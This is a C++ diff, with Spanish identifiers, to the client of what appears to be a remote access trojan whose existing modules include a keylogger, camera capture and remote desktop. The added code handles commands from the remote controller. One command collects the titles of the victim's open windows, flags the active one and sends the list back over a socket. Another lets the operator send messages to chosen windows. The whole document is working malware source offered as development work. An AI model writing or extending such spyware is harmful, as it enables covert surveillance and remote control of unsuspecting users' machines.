@@ -4,6 +4,7 @@
 #include "mod_keylogger.hpp"
 #include "mod_camara.hpp"
 #include "mod_remote_desktop.hpp"
+#include "mod_ventanas.hpp"
 #include "misc.hpp"
 
 extern Cliente* cCliente;
@@ -56,6 +57,11 @@ void Cliente::DestroyClasses() {
         }
         delete this->mod_Cam;
         this->mod_Cam = nullptr;
+    }
+
+    if (this->mod_AdminVen != nullptr) {
+        delete this->mod_AdminVen;
+        this->mod_AdminVen = nullptr;
     }
 
     __DBG_("[DC] Clases destruidas");
@@ -766,6 +772,41 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         return;
     }
 
+    //#####################################################
+    //#####################################################
+    //                ADMIN VENTANAS                      # 
+    if (iComando == EnumComandos::WM_Lista) {
+        if (!this->mod_AdminVen) {
+            this->mod_AdminVen = new mod_AdminVentanas();
+        }
+        //Enviar lista parseada de ventanas
+        std::string strPaquete = "";
+        for (VentanaInfo ventana : this->mod_AdminVen->m_ListaVentanas()) {
+            strPaquete += ventana.strTitle;
+            strPaquete += ventana.active ? " (ACTIVA)\\" : "\\";
+        }
+        if (strPaquete.size() > 0) {
+            strPaquete.pop_back();
+            this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::WM_Lista);
+        }
+        return;
+    }
+
+    if (iComando == EnumComandos::WM_CMD) {
+        if (!this->mod_AdminVen) {
+            this->mod_AdminVen = new mod_AdminVentanas();
+        }
+
+        strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 2);
+        if (strIn.size() == 2) {
+            int iCMD = atoi(strIn[1].c_str());
+            this->mod_AdminVen->m_WindowMSG(strIn[0], iCMD);
+        }else {
+            __DBG_("[RD] No se pudo parsear el paquete admin_ventanas");
+        }
+        
+        return;
+    }
 }
 
 void Cliente::Procesar_Paquete(const Paquete& paquete) {
